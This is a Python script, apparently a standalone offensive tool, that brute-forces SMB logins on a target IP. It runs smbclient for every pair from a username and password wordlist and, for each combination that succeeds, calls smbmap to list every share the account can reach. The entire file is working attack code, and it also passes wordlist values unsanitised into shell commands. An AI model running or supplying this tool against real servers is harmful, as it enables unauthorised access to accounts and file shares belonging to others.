#!/usr/bin/env python3

import os
import argparse
import sys

class smbbruteforce:
    def bruteforce(self, ip, username, password):
        found = []
        try:
            users = open(username, 'r')
            users = users.read().split("\n")
            users.pop()
        except:
            print("[!]  Unable to open File ==> {}".format(username))
            sys.exit()

        try:
            passwd = open(password, 'r')
            passwd = passwd.read().split("\n")
            passwd.pop()
        except:
            print("[!]  Unable to open File ==> {}".format(password))
            sys.exit()
        os.system("mkdir DUMP")
        for u in users:
            p = ' '
            try:
                if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) == 256:
                    for p in passwd:
                        try:
                            if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) != 256:
                                found.append("{}:{}".format(u, p))
                        except:
                            print("error on utente:{} and pass: {} ".format(u, p))
            except:
                print("error on utente:{} and pass: {} ".format(u, p))

        os.system("clear")
        os.system("rm -rf DUMP")
        print("user: " + str(found))
        if found == []:
            print("[*] NO MATCH FOUND ! ")
        else:
            print("[!!]MATCH FOUND ! GETTING SHARES ....\n")
            print("+----------------------------------------------------------------------+")
            for x in found:
                u = x.split(":")[0]
                p = x.split(":")[1]
                print("[*] SHARES FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u, p))
                os.system("smbmap -R -u {} -p {} -H {}".format(u, p, ip, ))
                print("+----------------------------------------------------------------------+")

        print("\n")

